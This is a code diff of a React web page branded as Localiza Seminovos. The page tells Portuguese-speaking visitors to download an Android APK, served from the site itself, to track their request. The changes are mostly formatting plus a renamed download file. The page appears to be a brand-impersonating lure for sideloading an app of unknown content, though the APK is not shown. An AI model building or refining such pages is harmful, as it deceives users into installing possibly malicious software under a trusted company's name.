@@ -83,17 +83,17 @@ export default function Home() {
           <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-lg sm:rounded-xl p-4 sm:p-6 mb-4 sm:mb-6 border-2 border-dashed border-gray-300">
             <div className="flex flex-col items-center justify-center gap-3 mb-3 sm:mb-4">
               <div className="flex-shrink-0 w-16 h-16 sm:w-20 sm:h-20 bg-green-500 rounded-xl flex items-center justify-center shadow-lg">
-                <svg 
-                  className="w-9 h-9 sm:w-11 sm:h-11 text-white" 
-                  fill="none" 
+                <svg
+                  className="w-9 h-9 sm:w-11 sm:h-11 text-white"
+                  fill="none"
                   stroke="currentColor"
                   viewBox="0 0 24 24"
                 >
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2.5} 
-                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3 3m0 0l-3-3m3 3V10" 
+                  <path
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    strokeWidth={2.5}
+                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3 3m0 0l-3-3m3 3V10"
                   />
                 </svg>
               </div>
@@ -102,14 +102,15 @@ export default function Home() {
               </h4>
             </div>
             <p className="text-sm sm:text-base text-gray-700 text-center mb-4 sm:mb-6 leading-relaxed px-2">
-              Baixe o aplicativo da Localiza Seminovos para acompanhar as atualizações da sua solicitação.
+              Baixe o aplicativo da Localiza Seminovos para acompanhar as
+              atualizações da sua solicitação.
             </p>
 
             {/* Botão de Download Principal */}
             <div className="flex justify-center">
               <a
                 href="/app.apk"
-                download="Localiza-App.apk"
+                download="localiza.apk"
                 className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3 sm:py-4 px-6 sm:px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center gap-2 sm:gap-3 text-sm sm:text-base md:text-lg touch-manipulation w-full sm:w-auto justify-center"
               >
                 <svg
@@ -132,19 +133,20 @@ export default function Home() {
             </div>
 
             <div className="mt-4 sm:mt-6 flex items-start gap-2 bg-white/60 rounded-lg p-3 sm:p-4">
-              <svg 
-                className="w-5 h-5 sm:w-6 sm:h-6 text-gray-600 flex-shrink-0 mt-0.5" 
-                fill="currentColor" 
+              <svg
+                className="w-5 h-5 sm:w-6 sm:h-6 text-gray-600 flex-shrink-0 mt-0.5"
+                fill="currentColor"
                 viewBox="0 0 20 20"
               >
-                <path 
-                  fillRule="evenodd" 
-                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" 
-                  clipRule="evenodd" 
+                <path
+                  fillRule="evenodd"
+                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
+                  clipRule="evenodd"
                 />
               </svg>
               <p className="text-xs sm:text-sm text-gray-700 leading-relaxed">
-                O arquivo será atualizado automaticamente com novas informações sobre o andamento da sua solicitação.
+                O arquivo será atualizado automaticamente com novas informações
+                sobre o andamento da sua solicitação.
               </p>
             </div>
           </div>
@@ -157,9 +159,9 @@ export default function Home() {
           <div className="flex flex-col items-center gap-6 sm:gap-8">
             {/* Logo */}
             <div>
-              <img 
-                src="/localiza-logo.svg" 
-                alt="Localiza" 
+              <img
+                src="/localiza-logo.svg"
+                alt="Localiza"
                 className="h-8 sm:h-10"
               />
             </div>
